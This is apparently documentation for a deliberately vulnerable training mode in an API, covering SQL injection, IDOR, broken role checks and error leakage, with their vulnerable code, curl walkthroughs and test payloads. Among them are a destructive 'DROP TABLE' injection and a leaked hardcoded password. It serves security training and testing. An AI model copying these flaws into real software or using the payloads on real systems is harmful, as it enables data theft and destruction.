# VAPT Lab Mode

> Italian version: [VAPT Lab Mode](../04-vapt-lab-mode.md)

## Overview

**VAPT Lab Mode** is a controlled development mode that exposes 4 **intentional** security vulnerabilities for educational and testing purposes. When activated, the service becomes deliberately vulnerable to:

1. **SQL Injection** — string concatenation in raw SQL queries
2. **IDOR** (Insecure Direct Object Reference) — access without ownership verification
3. **Broken Role-Based Access Control** — authorization control bypass
4. **Error Leakage** — exposure of stack traces and technical details

## ⚠️ Critical Warning

**DO NOT** enable VAPT Lab Mode in production, staging, or any deployment accessible to anyone outside your test team. These vulnerabilities are **critical** and violate security standards.

- ❌ **Never** in production
- ❌ **Never** in staging
- ✅ **Only** in isolated local test environments or dedicated VMs

---

## Activation

### Option 1: Environment Variable (API)

```bash
ENABLE_VAPT_LAB_MODE=true dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj
```

At startup, you'll see in the logs:

```
warn: VaptLab
      ╔════════════════════════════════════════════════════════════════╗
      ║  VAPT LAB MODE ENABLED — intentionally vulnerable             ║
      ║  Set ENABLE_VAPT_LAB_MODE=false to restore safe behaviour.   ║
      ╚════════════════════════════════════════════════════════════════╝
```

### Option 2: Docker Compose

Modify `docker/docker-compose.yml` for the `naas` service:

```yaml
services:
  naas:
    build: .
    environment:
      - ENABLE_VAPT_LAB_MODE=true
      # ... other variables ...
```

### Option 3: Frontend (React)

The front-end displays a warning banner when VAPT Lab Mode is active. To enable it client-side:

```bash
VITE_ENABLE_VAPT_LAB_MODE=true npm run dev
```

In the browser you'll see a red banner at the top of the page warning about the vulnerable mode.

---

## The 4 Vulnerabilities

### 1️⃣ SQL Injection

**Endpoint:** `GET /customers?search=<payload>`

**Safe behavior (default):**

```bash
curl "http://localhost:8000/customers?search=' OR '1'='1' --" \
  -H "Authorization: Bearer $TOKEN"

# Result: searches literally for the text "' OR '1'='1' --" (no matches)
```

**Vulnerable behavior (VAPT Mode):**

```bash
# Same command — SQL payload is executed directly
# Query returns all customers (WHERE clause bypassed)
```

**Test payloads:**

```sql
' OR '1'='1' --
' UNION SELECT 1,2,3,4,5 --
'; DROP TABLE customers; --
```

**Vulnerable code (in Program.cs, L529+):**

```csharp
if (vaptLabMode && db.Database.IsRelational())
{
    var rawSql = $"""SELECT "Id","Name","Email","CodiceFiscale","CreatedAt"
                    FROM customers WHERE "Name" ILIKE '%{search}%'""";
    return Results.Ok(await db.Customers.FromSqlRaw(rawSql).ToListAsync());
}
```

---

### 2️⃣ IDOR (Insecure Direct Object Reference)

**Endpoint:** `GET /projects/{id}`, `PUT /projects/{id}`, `DELETE /projects/{id}`

**Test scenario:**

1. Register and authenticate two users: `alice` and `bob`
2. Alice creates a project → receives ID `5`
3. Bob attempts to access Alice's project using the same ID

**Safe behavior (default):**

```bash
# Bob — with bob's token
curl "http://localhost:8000/projects/5" \
  -H "Authorization: Bearer $BOB_TOKEN"

# Result: 403 Forbidden (project belongs to Alice)
```

**Vulnerable behavior (VAPT Mode):**

```bash
# Same command — returns Alice's project (200 OK)
# Bob can read, modify, and delete anyone's projects
```

**Vulnerable endpoints:**

- `GET /projects/{id}` — reads other users' projects
- `PUT /projects/{id}` — modifies other users' projects
- `DELETE /projects/{id}` — deletes other users' projects

---

### 3️⃣ Broken Role-Based Access Control

**Endpoint:** `GET /admin/stats`

**Setup:** Create a user with username `admin` (JWT automatically receives `role=admin` claim)

**Safe behavior (default):**

```bash
# Non-admin user
curl "http://localhost:8000/admin/stats" \
  -H "Authorization: Bearer $USER_TOKEN"

# Result: 403 Forbidden (role not "admin")
```

**Vulnerable behavior (VAPT Mode):**

```bash
# Same command — returns statistics (200 OK)
# Any authenticated user can access admin data
```

---

### 4️⃣ Error Leakage

**Endpoint:** All endpoints (trigger via `/vapt/trigger-error`)

**Safe behavior (default):**

```bash
curl "http://localhost:8000/vapt/trigger-error" \
  -H "Authorization: Bearer $TOKEN"

# Result: 500 + generic response:
# {
#   "status": "error",
#   "message": "An unexpected error occurred. Please contact support.",
#   "requestId": "abc123"
# }
```

**Vulnerable behavior (VAPT Mode):**

```bash
# Same command — exposes full stack trace + hardcoded credentials:
# {
#   "status": "error",
#   "message": "An unexpected error occurred...",
#   "requestId": "abc123",
#   "exception": "System.Exception: Test exception...",
#   "stackTrace": "at NoAsAService.Api.Program...",
#   "innerException": "...",
#   "vapt_note": "VAPT LAB MODE: technical details exposed intentionally",
#   "database_password": "DevPassword123456"
# }
```

---

## Automated Tests

All VAPT scenarios are covered by automated tests in [VaptSecurityTests.cs](../src/tests/NoAsAService.Api.Tests/VaptSecurityTests.cs):

```bash
dotnet test src/tests/NoAsAService.Api.Tests/NoAsAService.Api.Tests.csproj \
  --filter VaptSecurityTests -v normal
```

Tests verify that:

- ✅ Safe mode blocks every attack
- ✅ VAPT mode exposes the vulnerability as expected

---

## Recommended Test Flow

### 1. SQL Injection

```bash
# 1. Start server in VAPT mode
ENABLE_VAPT_LAB_MODE=true dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# 2. Create a customer
curl -X POST http://localhost:8000/customers \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Test Corp", "email": "test@corp.test", "codiceFiscale": "TESTCORP123A0150"}'

# 3. Search with SQLi payload
curl "http://localhost:8000/customers?search=' OR '1'='1' --" \
  -H "Authorization: Bearer $TOKEN"

# Expected: In VAPT mode, returns ALL customers (injection successful)
```

### 2. IDOR

```bash
# 1. Register alice and bob
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "Pass123456"}'

curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "bob", "password": "Pass123456"}'

# 2. Alice creates a project (note returned id)
curl -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{"name": "Secret Project", "customerId": 1}'

# 3. Bob accesses Alice's project by ID
curl http://localhost:8000/projects/5 \
  -H "Authorization: Bearer $BOB_TOKEN"

# Expected: In VAPT mode, Bob can read it (403 in safe mode)
```

### 3. Broken Role

```bash
# 1. Create admin user (username="admin")
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "Pass123456"}'

# 2. Create regular user
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "normaluser", "password": "Pass123456"}'

# 3. Regular user tries /admin/stats
curl http://localhost:8000/admin/stats \
  -H "Authorization: Bearer $NORMALUSER_TOKEN"

# Expected: In VAPT mode, succeeds (403 in safe mode)
```

### 4. Error Leakage

```bash
# Trigger error endpoint (available in both modes)
curl http://localhost:8000/vapt/trigger-error \
  -H "Authorization: Bearer $TOKEN"

# Expected: In VAPT mode, response includes stack trace + "database_password"
```

---

## Deactivation

To return to safe mode:

```bash
# Option 1: Restart without ENABLE_VAPT_LAB_MODE variable
dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# Option 2: Explicitly set to false
ENABLE_VAPT_LAB_MODE=false dotnet run --project src/NoAsAService.Api/NoAsAService.Api.csproj

# Option 3: Docker Compose
docker compose down
# Modify docker-compose.yml to remove ENABLE_VAPT_LAB_MODE=true or set to false
docker compose up
```

---

## Usage Scenarios

✅ **Appropriate for:**

- Application security training (dev teams)
- Internal authorized penetration testing
- Validation of automated security tests
- Isolated training sandboxes

❌ **Not appropriate for:**

- Public deployments
- Production environments
- Public demos without explicit warning
- Any uncontrolled situation

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-639: IDOR](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-639: Broken Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [Test file](../src/tests/NoAsAService.Api.Tests/VaptSecurityTests.cs)
